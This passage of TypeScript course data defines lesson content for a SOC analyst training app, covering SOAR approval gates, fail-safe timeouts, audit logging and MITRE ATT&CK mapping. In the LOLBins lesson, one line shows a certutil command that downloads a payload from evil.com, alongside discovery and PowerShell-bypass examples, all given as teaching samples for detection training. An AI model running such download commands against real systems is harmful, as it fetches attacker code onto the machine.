            { id: 'not-analyst-summary', label: '3. SUMMARY NOTE' },
            { id: 'not-karthik-guardrail', label: '4. KARTHIK RULE' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: NOTIFICATION STANDARDS',
          subPillar: 'PROVENANCE, TIMESTAMPS & CONFIDENCE BOUNDARIES',
          heading: '4-Pillar Forensic Notification Quality',
          paragraph1:
            'An automated notification that simply reads "Malicious IP Detected" is useless noise. High-quality SOC automation enforces four mandatory notification standards: Source Provenance, UTC Timestamps, Qualified Findings, and Confidence Limits.',
          paragraph2:
            'Karthik highlights: "State exactly who reported the observable, when the query executed in UTC, what the empirical score is, and what caveats apply. That gives senior analysts instant confidence in your automated alerts."',
          techBoxTitle: 'TECH BOX: Evidentiary Rigor in Automated Alerts',
          techBoxAnalogy:
            'Like a certified forensic laboratory report: listing chain of custody, testing methodology, calibrated instrument readings, and error margins rather than vague casual impressions.',
          techBoxDef:
            'Notification Standards: The four architectural requirements for automated alert formatting: Provenance (source feed ID), UTC Timestamp (timezone-normalized), Qualified Finding (objective score), and Uncertainty Bounds (decay/recency caveats).',
          techBoxWhy:
            'Prevents false alarms caused by stale intelligence and ensures alerts are immediately actionable without requiring redundant investigation.',
          defaultAnimation: 'm12-notification-evidence-standards' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'std-provenance-source', label: '1. PROVENANCE' },
            { id: 'std-utc-timestamp', label: '2. UTC TIMESTAMP' },
            { id: 'std-qualified-finding', label: '3. QUALIFIED FINDING' },
            { id: 'std-confidence-boundaries', label: '4. CAVEAT BOUNDS' },
          ],
        },
      ];
    }

    // Chapter 3: Conditions and approval gates
    if (chId === 'M12-U2-C1') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: APPROVAL BARRIERS',
          subPillar: 'READ-ONLY VS DISRUPTIVE ACTIONS',
          heading: 'Enforcing Hard Boundaries on Automated Containment',
          paragraph1:
            'In SOC automation, actions fall into two strictly segregated tiers: Read-Only Enrichment and Disruptive Containment. While enrichment can run autonomously 24/7, disruptive containment must halt before a hard human approval barrier.',
          paragraph2:
            'Karthik teaches: "Quarantining an endpoint, dropping a firewall port, or resetting user passwords causes immediate business disruption. A playbook pauses at the barrier and waits for an authorized human to inspect the evidence and click Approve."',
          techBoxTitle: 'TECH BOX: Physical & Logical SOAR Containment Gates',
          techBoxAnalogy:
            'Like the physical interlocks on an electrical substation: diagnostic voltage meters operate continuously without hindrance, but opening the main high-voltage circuit breaker requires turning a physical key held by the shift supervisor.',
          techBoxDef:
            'Approval Gate: A synchronized pause state in a SOAR playbook where automated execution halts and waits for explicit cryptographic or web-based authorization from a human analyst before performing disruptive containment.',
          techBoxWhy:
            'Shields the enterprise from catastrophic automated containment runaways caused by false positive alerts or adversary spoofing.',
          defaultAnimation: 'm12-human-approval-gate' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'gate-enrich-complete', label: '1. ENRICH COMPLETE' },
            { id: 'gate-containment-barrier', label: '2. HARD BARRIER' },
            { id: 'gate-human-decision', label: '3. SHIFT LEAD GATE' },
            { id: 'gate-audited-execution', label: '4. AUDITED ACTION' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: AUTHORIZATION SCOPE',
          subPillar: 'SPECIFIC TARGET BINDING & BLANK CHECK TRAPS',
          heading: 'Role Permissions & Explicit Asset Contracts',
          paragraph1:
            'An approval is meaningless if it lacks strict scoping. An approval request must bind directly to the exact target hostname (e.g. BLR-BR-WS-04) and enforce role-based authorization: standard apprentices cannot approve enterprise network blocks.',
          paragraph2:
            'Karthik cautions: "Beware the blank field trap! If an approval ticket has an empty or wildcard target field, the script must abort immediately. Never sign a blank check in automation."',
          techBoxTitle: 'TECH BOX: Scope Restrictions & Time-Bounded Approvals',
          techBoxAnalogy:
            'Like a building access pass that opens only Floor 3 Room B for exactly two hours, rather than a master skeleton key that permanently unlocks all server rooms.',
          techBoxDef:
            'Role Authorization Scope: The explicit binding of containment authority to a validated security role (Shift Lead / Tier-2) with strict target parameters and a maximum expiration window (30 minutes).',
          techBoxWhy:
            'Prevents unauthorized containment actions and eliminates script bugs where wildcard targets cause widespread unintentional network lockouts.',
          defaultAnimation: 'm12-role-authorization-scope' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'scope-target-binding', label: '1. TARGET BINDING' },
            { id: 'scope-role-authorization', label: '2. ROLE CHECK' },
            { id: 'scope-blank-field-trap', label: '3. BLANK FIELD TRAP' },
            { id: 'scope-time-bounded', label: '4. 30-MIN WINDOW' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: TIMEOUT SILENCE DOCTRINE',
          subPillar: 'FAIL-SAFE NON-EXECUTION UPON EXPIRY',
          heading: '"Silence Is NOT Authorization"',
          paragraph1:
            'What happens when an approval request is dispatched at 3:00 AM, but the on-shift lead is handling a physical server emergency and does not respond within 15 minutes? Flawed systems assume approval. Safe systems enforce the Silence Doctrine.',
          paragraph2:
            'Karthik declares: "Silence must not turn into accidental authorisation. If the timer expires with zero human response, the playbook defaults to safe non-execution, logs a timeout incident, and alerts the secondary paging rota."',
          techBoxTitle: 'TECH BOX: Fail-Safe Defaults in Automation Workflows',
          techBoxAnalogy:
            'Like the dead-man pedal on a train locomotive: if the driver does not depress the pedal every 60 seconds, the engine does not accelerate; it automatically cuts power and applies the emergency air brakes.',
          techBoxDef:
            'The Silence Doctrine: An immutable architectural principle requiring that unacknowledged approval requests time out into safe non-execution rather than proceeding autonomously.',
          techBoxWhy:
            'Guarantees that human oversight cannot be bypassed through deliberate delay, notification fatigue, or analyst unavailability.',
          defaultAnimation: 'm12-timeout-silence-doctrine' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'time-window-timer', label: '1. 15-MIN TIMER' },
            { id: 'time-failsafe-nonexec', label: '2. FAIL-SAFE ABORT' },
            { id: 'time-accidental-auth-risk', label: '3. SILENCE ≠ PERMIT' },
            { id: 'time-karthik-silence-law', label: '4. SILENCE LAW' },
          ],
        },
      ];
    }

    // Chapter 4: Failure handling, logging and auditability
    if (chId === 'M12-U2-C2') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: CONNECTOR FAILURES',
          subPillar: 'NO ADVERSE RESULT VS NO RESULT AVAILABLE',
          heading: 'Distinguishing HTTP 504 Timeouts from Benign Verdicts',
          paragraph1:
            'One of the most dangerous bugs in security automation is confusing connector failure with a clean bill of health. When a threat intelligence API returns HTTP 504 Gateway Timeout or 429 Rate Limited, there is no malicious score in the payload.',
          paragraph2:
            'Karthik stresses: "A missing score due to network timeout is NOT a clean score. No adverse result (HTTP 200, Score 0) is fundamentally different from no result available (HTTP 504). Playbooks must flag the observable as UNKNOWN."',
          techBoxTitle: 'TECH BOX: Fail-Closed vs Fail-Open Sensor Philosophy',
          techBoxAnalogy:
            'Like a blood pressure cuff that displays an error code because the battery died: a dead monitor does not mean your blood pressure is perfect; it means no reading was taken.',
          techBoxDef:
            'Connector Failure Handling: The defensive programming practice of inspecting HTTP response status codes and network sockets before parsing payload fields, ensuring network errors are categorized as UNKNOWN rather than BENIGN.',
          techBoxWhy:
            'Prevents threat actors from slipping malicious C2 beacons past automated detection by deliberately flooding threat feeds or abusing rate limits.',
          defaultAnimation: 'm12-connector-failure-handling' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'conn-http-504', label: '1. HTTP 504 TIMEOUT' },
            { id: 'conn-fallacy-benign', label: '2. DEADLY FALLACY' },
            { id: 'conn-safe-classification', label: '3. UNKNOWN VERDICT' },
            { id: 'conn-karthik-rule', label: '4. FAILURE LAW' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: BOUNDED RETRIES',
          subPillar: 'EXPONENTIAL BACKOFF & CIRCUIT BREAKERS',
          heading: 'Preventing API Storms and Cascading Failures',
          paragraph1:
            'When an external security connector experiences a brief network hiccup, retrying immediately in a tight loop floods the endpoint and triggers permanent API rate-limit bans. Production playbooks require bounded retries with exponential backoff.',
          paragraph2:
            'Karthik explains: "We wait 1 second on attempt 1, 2 seconds on attempt 2, and 4 seconds on attempt 3. If it still fails, the circuit breaker trips, halting automated queries and alerting the engineering team without overwhelming downstream services."',
          techBoxTitle: 'TECH BOX: Jittered Backoff & Circuit Breaker Tripping',
          techBoxAnalogy:
            'Like calling a busy colleague: dialing back every 2 seconds annoys them and jams their line; waiting 1 minute, then 2 minutes, and eventually leaving a voicemail preserves communication sanity.',
          techBoxDef:
            'Bounded Retries & Circuit Breaker: An algorithmic pattern where failed API requests retry with exponentially increasing delays up to a strict bound (max 3 retries), after which the circuit opens to stop further calls.',
          techBoxWhy:
            'Guarantees system stability during third-party cloud outages, preventing self-inflicted Denial of Service against critical security tooling.',
          defaultAnimation: 'm12-bounded-retries-circuit' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'ret-attempt-one', label: '1. ATTEMPT 1 (1s)' },
            { id: 'ret-attempt-two', label: '2. ATTEMPT 2 (2s)' },
            { id: 'ret-attempt-three', label: '3. ATTEMPT 3 (4s)' },
            { id: 'ret-circuit-breaker', label: '4. CIRCUIT BREAKER' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: FORENSIC AUDIT TRAILS',
          subPillar: 'STEP-BY-STEP TELEMETRY & JSON RECORDS',
          heading: 'Immutable Execution Logging for SOC Accountability',
          paragraph1:
            'Every action taken by a playbook must be completely transparent and reconstructed after the incident. A playbook that cannot prove who triggered it, what input variables were parsed, and what API returned each result fails compliance audits.',
          paragraph2:
            'Karthik highlights: "SOAR logs every step with millisecond UTC timestamps and serializes execution telemetry into immutable JSON audit records. If a containment action is challenged during an investigation, the audit trail speaks for itself."',
          techBoxTitle: 'TECH BOX: Playbook Telemetry & Compliance Logs',
          techBoxAnalogy:
            'Like the cockpit flight data recorder (black box) that logs rudder positions, airspeed, engine temperatures, and pilot control inputs every fraction of a second.',
          techBoxDef:
            'Playbook Audit Trail: A cryptographically timestamped, structured JSON record documenting every step, variable input, API return, human authorization decision, and exception in a workflow.',
          techBoxWhy:
            'Satisfies ISO 27001 and SOC 2 evidentiary compliance while giving incident response leads definitive root-cause visibility into automated workflows.',
          defaultAnimation: 'm12-playbook-audit-trail' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'aud-step-telemetry', label: '1. STEP TELEMETRY' },
            { id: 'aud-json-serialization', label: '2. JSON SNAPSHOT' },
            { id: 'aud-exception-trace', label: '3. EXCEPTION TRACE' },
            { id: 'aud-compliance-record', label: '4. COMPLIANCE SEAL' },
          ],
        },
      ];
    }

    // Chapter 5: Human review and reversible actions
    if (chId === 'M12-U3-C1') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: MEANINGFUL HUMAN REVIEW',
          subPillar: 'TARGET + EVIDENCE + APPROVER + REVERSAL',
          heading: 'The 4 Core Elements of Validated Human Review',
          paragraph1:
            'Human-in-the-loop is not just a rubber stamp where an exhausted analyst clicks OK without reading. Meaningful human review requires the concurrent inspection of four synchronized elements: Exact Target Asset, Evidence Basis, Authorized Approver, and Tested Reversal Plan.',
          paragraph2:
            'Karthik teaches: "If any one of these four pillars is missing, the review is incomplete. You cannot approve isolating a machine if you do not know its hostname, its role in the business, the evidence justifying the block, and how to undo it."',
          techBoxTitle: 'TECH BOX: Meaningful Oversight vs Rubber-Stamping',
          techBoxAnalogy:
            'Like a chief surgical nurse verifying the patient name, operating site marker, surgical consent form, and backup resuscitation equipment before the lead surgeon makes an incision.',
          techBoxDef:
            'Meaningful Human Review Quad: The mandatory verification checklist presented to an approver: Target Asset (hostname/IP), Evidence Docket (observable reputation), Signer Authority (role check), and Rollback Readiness (inverse script).',
          techBoxWhy:
            'Eliminates careless alert fatigue approvals and ensures that every containment action is legally, technically, and operationally defensible.',
          defaultAnimation: 'm12-meaningful-human-review' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'rev-triad-target', label: '1. EXACT ASSET' },
            { id: 'rev-triad-evidence', label: '2. EVIDENCE BASIS' },
            { id: 'rev-triad-approver', label: '3. AUTH APPROVER' },
            { id: 'rev-triad-reversal', label: '4. REVERSAL PLAN' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: TARGET MISMATCH RESTRAINT',
          subPillar: 'CATCHING SCRIPT DEFECTS & REWARDING RESTRAINT',
          heading: 'Preventing Accidental Domain Controller Isolation',
          paragraph1:
            'Consider this scenario: An automated script intended to isolate finance workstation BLR-BR-WS-04 suffers a string parsing bug and populates the containment field with BLR-BR-SRV-01—the primary Active Directory Domain Controller.',
          paragraph2:
            'Karthik notes: "Analyst Priya spotted the discrepancy, halted the playbook, and pressed CANCEL. Safe automation rewards restraint as well as successful execution. Catching a defective script saved the entire Bangalore branch from total collapse."',
          techBoxTitle: 'TECH BOX: Scope Verification & Rewarding Restraint',
          techBoxAnalogy:
            'Like a pharmacy technician who double-checks an automated dispensing machine and catches a label mixup before the wrong medication reaches a hospital patient.',
          techBoxDef:
            'Target Mismatch Restraint: The cognitive discipline of verifying that automated script variables correspond precisely to the triaged alert observable, deliberately aborting execution when anomalies appear.',
          techBoxWhy:
            'Cultivates an elite engineering culture where preventing catastrophic collateral damage is valued as highly as rapid adversary containment.',
          defaultAnimation: 'm12-target-mismatch-restraint' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'mis-script-defect', label: '1. SCRIPT DEFECT' },
            { id: 'mis-target-discrepancy', label: '2. DISCREPANCY' },
            { id: 'mis-analyst-restraint', label: '3. RESTRAINT' },
            { id: 'mis-karthik-commendation', label: '4. COMMENDATION' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: REVERSAL ARCHITECTURE',
          subPillar: 'PRE-ENGINEERED ROLLBACKS & REVERSAL COSTS',
          heading: 'The Operational Costs of "We Can Always Undo"',
          paragraph1:
            'Engineers often succumb to the "reversibility fallacy"—the belief that because an isolation can be undone, containment carries zero cost. Severing a workstation kills open database connections, interrupts financial payroll batches, and disrupts staff operations.',
          paragraph2:
            'Karthik explains: "Every containment action must bundle its pre-engineered inverse script: reconnectHost(targetId). But remember: reversibility is a safety net, not an excuse for sloppy, unverified trigger conditions."',
          techBoxTitle: 'TECH BOX: Rollback Scripts & Disruption Economics',
          techBoxAnalogy:
            'Like pulling the building fire alarm: you can easily reset the glass pull station, but resetting it does not refund the lost work hours of 500 evacuated employees.',
          techBoxDef:
            'Reversal Plan Architecture: The mandatory inclusion of automated rollback procedures (EDR network reconnect, user unblock) paired with clear operational awareness of business disruption costs.',
          techBoxWhy:
            'Ensures rapid recovery when legitimate business systems are isolated during emergencies and enforces thoughtful containment decisions.',
          defaultAnimation: 'm12-reversal-plan-architecture' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'pln-rollback-script', label: '1. ROLLBACK SCRIPT' },
            { id: 'pln-fallacy-cost', label: '2. DISRUPTION COST' },
            { id: 'pln-restoration-sla', label: '3. RECOVERY SLA' },
            { id: 'pln-tested-reversibility', label: '4. TESTED REVERSAL' },
          ],
        },
      ];
    }

    // Chapter 6: What must not run automatically
    if (chId === 'M12-U3-C2') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: ABSOLUTE RED LINES',
          subPillar: 'DOMAIN CONTROLLERS, MASS LOCKS & OT/ICS',
          heading: 'What Must NEVER Run Automatically in a SOC',
          paragraph1:
            'Certain operational actions carry consequences so severe that they must NEVER be automated under any circumstances. In modern enterprise architecture, absolute red lines exist to protect core business survival and human life.',
          paragraph2:
            'Karthik declares: "Never automate the isolation of Domain Controllers. Never trigger mass account lockouts across more than five users automatically. And never ever automate containment against OT/ICS machinery or physical manufacturing lines."',
          techBoxTitle: 'TECH BOX: High-Consequence Operational Red Lines',
          techBoxAnalogy:
            'Like safety interlocks in a nuclear power plant: automated systems regulate coolant pumps and turbines, but emergency scram rods require manual authorization because an incorrect shutdown carries massive economic impact.',
          techBoxDef:
            'Absolute Red Lines: Non-negotiable organizational policy restrictions preventing playbooks from modifying critical domain infrastructure, bulk identity states, or cyber-physical OT systems without senior executive sign-off.',
          techBoxWhy:
            'Prevents threat actors from weaponizing your own SOAR platform to trigger enterprise-wide Denial of Service or cause physical machinery damage.',
          defaultAnimation: 'm12-never-automate-redlines' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'red-domain-controller', label: '1. NO DC ISOLATE' },
            { id: 'red-mass-account-lock', label: '2. NO BULK LOCK' },
            { id: 'red-ot-ics-machinery', label: '3. NO OT / ICS' },
            { id: 'red-karthik-redline-rule', label: '4. REDLINE RULE' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: DEDUPLICATION & IDEMPOTENCY',
          subPillar: 'CACHING KEYS & 50-ALERT STORM MITIGATION',
          heading: 'Idempotent Execution Across High-Volume Bursts',
          paragraph1:
            'When a botnet performs a fast credential-stuffing probe, the SIEM generates 50 alerts in 10 seconds for the same IP address. Without deduplication, your SOAR engine spawns 50 parallel playbooks, flooding ticketing queues and inducing analyst fatigue.',
          paragraph2:
            'Karthik teaches: "We calculate an idempotency key: HASH(Host + Observable + Day). The first alert executes the playbook and creates Case #2026-881. The subsequent 49 alerts match the 15-minute cache and suppress duplicate workflows automatically."',
          techBoxTitle: 'TECH BOX: Idempotency Keys & Storm Suppression',
          techBoxAnalogy:
            'Like a bank payment gateway: clicking "Submit Payment" five times in rapid succession charges your credit card only once because the unique idempotency key prevents duplicate transactions.',
          techBoxDef:
            'Alert Deduplication & Idempotency: The generation of unique composite keys to identify identical alert observables within a sliding time window (15 mins), ensuring a playbook executes exactly once per incident.',
          techBoxWhy:
            'Eliminates ticket queue floods, conserves third-party API query quotas, and keeps analyst queues focused on unique security events.',
          defaultAnimation: 'm12-deduplication-idempotency' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'ded-burst-ingest', label: '1. 50-ALERT STORM' },
            { id: 'ded-idempotency-key', label: '2. IDEMPOTENCY KEY' },
            { id: 'ded-cache-suppression', label: '3. 15-MIN CACHE' },
            { id: 'ded-single-case-output', label: '4. 1 MASTER CASE' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: MASTER SOAR SIGNOFF',
          subPillar: '5-STAGE TEST PACK & SUPERVISORY SEAL',
          heading: 'Pre-Production Verification & Karthik Certification',
          paragraph1:
            'Before any security playbook is deployed into live production, it must successfully pass Karthik\'s 5-Stage Test Pack: Valid Input, Malformed Input (RFC1918), Connector Failure (HTTP 504), Duplicate Burst (50 Alerts), and Approval Silence Abort.',
          paragraph2:
            'Mentor Karthik concludes: "You have mastered playbook anatomy, input validation, human-in-the-loop barriers, bounded retries, and the sacred boundaries of what must never run automatically. You have earned your Module 12 Certification and are ready for MITRE ATT&CK in Module 13!"',
          techBoxTitle: 'TECH BOX: Playbook Validation Harness & Module 12 Certified',
          techBoxAnalogy:
            'Like the final FAA flight certification of a new aircraft: testing crosswind landings, engine flameouts, hydraulic failures, and emergency autopilot disconnects before carrying commercial passengers.',
          techBoxDef:
            '5-Stage SOAR Test Pack: The comprehensive pre-production validation matrix verifying functional correctness, error resilience, rate-limit safety, deduplication performance, and fail-safe human gate compliance.',
          techBoxWhy:
            'Certifies that automation operates with surgical precision, elevating SOC efficiency while maintaining unbreakable defensive guardrails.',
          defaultAnimation: 'm12-master-soar-signoff' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'mas-test-matrix', label: '1. 5-STAGE TESTS' },
            { id: 'mas-soar-blueprint', label: '2. MASTER BLUEPRINT' },
            { id: 'mas-case-881-closure', label: '3. CASE #2026-881' },
            { id: 'mas-karthik-master-seal', label: '4. KARTHIK SEAL ✓' },
          ],
        },
      ];
    }

    // =========================================================================
    // MODULE 13: MITRE ATT&CK FOR L1 ANALYSTS
    // =========================================================================

    // Chapter 1: Tactics, techniques and procedures
    if (chId === 'M13-U1-C1') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: THE TTP TRIAD',
          subPillar: 'TACTIC VS TECHNIQUE VS PROCEDURE',
          heading: 'Deconstructing the TTP Triad Hierarchy',
          paragraph1:
            'The foundation of threat methodology is the TTP Triad: Tactic represents the adversary\'s technical objective (Why), Technique represents the general method used to achieve that goal (How), and Procedure represents the exact command execution, binary path, and parameters observed on the endpoint (What).',
          paragraph2:
            'Mentor Ananya emphasizes: "Never confuse these three layers. \'Discovery\' is a tactic—an objective. \'Account Discovery\' is a technique—a method. Running \'net user /domain\' is a procedure—the concrete command observed in Event ID 4688 or Sysmon 1."',
          techBoxTitle: 'TECH BOX: TTP Hierarchy & Layer Demarcation',
          techBoxAnalogy:
            'Like culinary arts: the tactic is "satisfy hunger" (objective), the technique is "bake a sourdough loaf" (method), and the procedure is "ferment 500g levain at 26°C for 4 hours with 72% hydration" (exact recipe execution).',
          techBoxDef:
            'TTP Triad: The hierarchical taxonomy organizing adversary actions from high-level operational objective (Tactic), through practical technical mechanism (Technique), down to specific implementation syntax (Procedure).',
          techBoxWhy:
            'Prevents superficial alert tagging and gives analysts a disciplined framework to categorize observed telemetry without conflating goals with executions.',
          defaultAnimation: 'm13-ttp-triad-hierarchy' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'ttp-tactic-objective', label: '1. TACTIC (WHY)' },
            { id: 'ttp-technique-method', label: '2. TECHNIQUE (HOW)' },
            { id: 'ttp-procedure-command', label: '3. PROCEDURE (WHAT)' },
            { id: 'ttp-ananya-guidance', label: '4. ANANYA RULE' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: MATRIX NAVIGATION',
          subPillar: '14 ENTERPRISE COLUMNS & L1 FOCUS',
          heading: 'Navigating the 14 Tactics of the Enterprise Matrix',
          paragraph1:
            'The MITRE ATT&CK Enterprise Matrix organizes adversary behavior across 14 tactical phases: Reconnaissance, Resource Development, Initial Access, Execution, Persistence, Privilege Escalation, Defense Evasion, Credential Access, Discovery, Lateral Movement, Collection, Command and Control, Exfiltration, and Impact.',
          paragraph2:
            'Ananya teaches: "As an L1 triage analyst, your primary hunting grounds are Execution, Credential Access, and Discovery. You are not writing threat actor dossiers on Reconnaissance; you are inspecting endpoint commands and credential breaches happening right now."',
          techBoxTitle: 'TECH BOX: Matrix Columns & Triage Boundary Scope',
          techBoxAnalogy:
            'Like a periodic table of chemical elements: you don\'t need to memorize every rare isotope at once, but you must know which reactive elements ignite when mixed in an endpoint session.',
          techBoxDef:
            'Enterprise Matrix: A globally accessible knowledge base of adversary tactics, techniques, and procedures based on real-world observations, structured into 14 progressive operational columns.',
          techBoxWhy:
            'Enables standardized communication across global SOCs, removing ambiguity between different security tools and intelligence feeds.',
          defaultAnimation: 'm13-matrix-navigation-grid' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'mat-tactics-progression', label: '1. 14 COLUMNS' },
            { id: 'mat-discovery-column', label: '2. DISCOVERY (TA0007)' },
            { id: 'mat-execution-column', label: '3. EXECUTION (TA0002)' },
            { id: 'mat-l1-scope-boundary', label: '4. L1 BOUNDARY' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: SHARED VOCABULARY',
          subPillar: 'NORMALIZING PROPRIETARY VENDOR ALARMS',
          heading: 'De-Jargonizing Vendor Alarms into Objective MITRE IDs',
          paragraph1:
            'Different security vendors invent sensationalist marketing jargon for identical behaviors: Vendor A alerts on "Extreme Threat: GhostStealth Memory Vault Infiltration", while Vendor B calls it "Apex Crypto Heist". MITRE ATT&CK de-jargonizes both into T1003.001 (OS Credential Dumping: LSASS Memory).',
          paragraph2:
            'Ananya highlights: "Proprietary alarm titles create mass confusion during shift handoffs. By mapping vendor alerts to standardized ATT&CK IDs with evidentiary telemetry anchors, both the L1 analyst and the CISO speak the exact same objective dialect."',
          techBoxTitle: 'TECH BOX: Vendor Normalization & Dialect Bridging',
          techBoxAnalogy:
            'Like medical diagnostic codes (ICD-10): whether an emergency nurse speaks colloquial Hindi, French, or English, ICD-10 code I21.9 objectively records an acute myocardial infarction.',
          techBoxDef:
            'Shared Vocabulary Normalization: The translation of proprietary EDR/SIEM threat alert names into neutral, standardized MITRE ATT&CK technique IDs backed by observable execution telemetry.',
          techBoxWhy:
            'Prevents cognitive fatigue and eliminates vendor bias, enabling multi-vendor SOC teams to coordinate containment actions seamlessly.',
          defaultAnimation: 'm13-shared-vocabulary-engine' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'voc-vendor-alarm-chaos', label: '1. VENDOR JARGON' },
            { id: 'voc-mitre-translation', label: '2. MITRE NORMALIZER' },
            { id: 'voc-case-881-mapping', label: '3. CASE #2026-881' },
            { id: 'voc-ananya-standard', label: '4. ANANYA STANDARD' },
          ],
        },
      ];
    }

    // Chapter 2: Using the matrix as a vocabulary
    if (chId === 'M13-U1-C2') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: DESCRIPTIVE NOT MALICE',
          subPillar: 'ATT&CK DESCRIBES MECHANICS, CONTEXT DETERMINES MALICE',
          heading: 'The Golden Rule: Technique Tag ≠ Automatic Evil',
          paragraph1:
            'A critical rookie mistake in the SOC is assuming that because an activity matches a MITRE ATT&CK technique, an adversary attack is in progress. ATT&CK describes what the system did mechanically, not the moral intent of the human behind the keyboard.',
          paragraph2:
            'Ananya points to the terminal: "When IT admin Rajesh runs `whoami /groups` during a routine domain audit, that execution is mechanically T1033 (System Owner/User Discovery). It is authorized IT operations. Context—user token, parent process, work ticket—determines malice."',
          techBoxTitle: 'TECH BOX: Descriptive Mechanics vs Moral Intent',
          techBoxAnalogy:
            'Like a scalpel: in the hands of an authorized orthopedic surgeon, a scalpel incision is a life-saving procedure; in an alley assault, the exact same mechanical cut is aggravated battery.',
          techBoxDef:
            'Descriptive Doctrine: The core architectural principle that MITRE ATT&CK catalogs objective operating system mechanics; maliciousness can only be established through operational authorization context.',
          techBoxWhy:
            'Stops analysts from generating panicked false alarms for routine system administration scripts and IT maintenance tasks.',
          defaultAnimation: 'm13-descriptive-not-malice' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'des-observed-mechanic', label: '1. OBSERVED MECHANIC' },
            { id: 'des-authorization-context', label: '2. CONTEXT ENGINE' },
            { id: 'des-rajesh-admin-use', label: '3. RAJESH (ADMIN)' },
            { id: 'des-malicious-actor-use', label: '4. ADVERSARY USE' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: OBSERVABLE PIPELINE',
          subPillar: 'FROM RAW EVENT TO VERIFIED MITRE TECHNIQUE',
          heading: 'The 4-Stage Observable-to-Technique Ingestion Pipeline',
          paragraph1:
            'Mapping an observable to ATT&CK is not guesswork; it follows a rigorous 4-stage pipeline: 1. Raw Telemetry Event -> 2. Observable Extraction (Binary, Path, Arguments, Parent) -> 3. Objective Technical Mechanic -> 4. MITRE ATT&CK Technique Mapping with Evidentiary Anchor.',
          paragraph2:
            'Ananya demonstrates: "Look at Sysmon Event ID 1 on CDAC-BLR-WS-12: `powershell.exe -ExecutionPolicy Bypass -File C:\\Users\\Public\\sync.ps1`. The observable is powershell executing a script in a public directory; the mechanic is PowerShell execution; the mapped technique is T1059.001."',
          techBoxTitle: 'TECH BOX: Telemetry Parsing & Technique Grounding',
          techBoxAnalogy:
            'Like a legal courtroom chain of custody: the prosecutor doesn\'t just claim a theft occurred; they present the security video timestamp, the fingerprints on the glass, and the specific statutory penal code violated.',
          techBoxDef:
            'Observable-to-Technique Pipeline: The systematic process of extracting granular host/network telemetry fields to justify and anchor an ATT&CK technique classification without speculative leaps.',
          techBoxWhy:
            'Guarantees that every mapped technique in an incident ticket is backed by concrete log proof that will survive senior IR and forensic peer review.',
          defaultAnimation: 'm13-observable-technique-pipeline' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'obs-raw-command-event', label: '1. RAW EVENT (EID 1)' },
            { id: 'obs-process-telemetry', label: '2. OBSERVABLE PARSE' },
            { id: 'obs-mitre-technique-link', label: '3. T1059.001 LINK' },
            { id: 'obs-evidence-anchor', label: '4. EVIDENCE ANCHOR' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: LOLBINS PARADOX',
          subPillar: 'LIVING OFF THE LAND BINARIES & DUAL-USE DILEMMAS',
          heading: 'Resolving the Dual-Use LOLBins Operational Dilemma',
          paragraph1:
            'Adversaries weaponize legitimate Windows OS binaries—Living Off The Land Binaries (LOLBins)—such as certutil.exe, msiexec.exe, and bitsadmin.exe. Because these executables are Microsoft-signed, traditional antivirus signatures trust them implicitly.',
          paragraph2:
            'Ananya explains: "`certutil.exe -verifyctl` verifies a certificate revocation list (legitimate). `certutil.exe -urlcache -split -f http://evil.com/payload.exe` downloads an external Trojan (T1105 Ingress Tool Transfer). The binary is identical; the arguments reveal the intent."',
          techBoxTitle: 'TECH BOX: Dual-Use Utilities & Command-Line Inspection',
          techBoxAnalogy:
            'Like a locksmith\'s lockpick set: in a licensed locksmith\'s van during business hours, it is a legitimate tool of trade; carried inside an office at 3 AM through a broken window, it is burglar tools.',
          techBoxDef:
            'LOLBin Paradox: The analytical challenge where trusted, native operating system binaries are abused for adversary objectives, requiring command-line parameter inspection rather than hash-based blocking.',
          techBoxWhy:
            'Equips L1 analysts to identify stealthy, signature-evading attacks that bypass standard antivirus by piggybacking on authorized OS executables.',
          defaultAnimation: 'm13-dual-use-lolbins-paradox' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'lol-dual-use-binary', label: '1. LOLBIN DUAL-USE' },
            { id: 'lol-certutil-legit', label: '2. CERTUTIL LEGIT' },
            { id: 'lol-certutil-abuse', label: '3. CERTUTIL ABUSE' },
            { id: 'lol-analyst-dilemma', label: '4. L1 RESOLUTION' },
          ],
        },
      ];
    }

    // Chapter 3: Credential access and discovery examples
    if (chId === 'M13-U2-C1') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: CREDENTIAL ACCESS',
